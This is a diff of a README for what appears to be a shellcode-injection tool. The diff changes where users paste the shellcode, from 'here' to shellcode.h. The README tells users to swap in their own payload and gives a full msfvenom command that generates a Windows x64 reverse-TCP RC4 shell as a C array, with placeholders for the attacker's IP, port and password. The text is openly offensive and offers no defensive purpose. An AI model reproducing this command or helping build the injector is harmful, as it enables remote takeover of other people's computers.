@@ -9,12 +9,14 @@ and injecting shell code in my example its reverse_shell + ONWORK builder to cha
 
 
 before use change the shellcode to your shellcode you can generate it useing msfvenom 
-++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+
 working on builder that take the shell code from txt file
 
 
 for example ```msfvenom --platform windows --arch x64 EXITFUNC=thread -p windows/x64/shell/reverse_tcp_rc4 LHOST=YOURE_IP LPORT=YOURE_PORT RC4PASSWORD=YOURE_PASS EXITFUNC=thread -f c --var-name=ucReverseShell```
-copy it to here  
+copy it to shellcode.h
 ![Screenshot (8)](https://github.com/masterconi/shellinject/assets/85493153/d8ef7109-650f-40f0-af7f-aad2e9be4628)
 
 
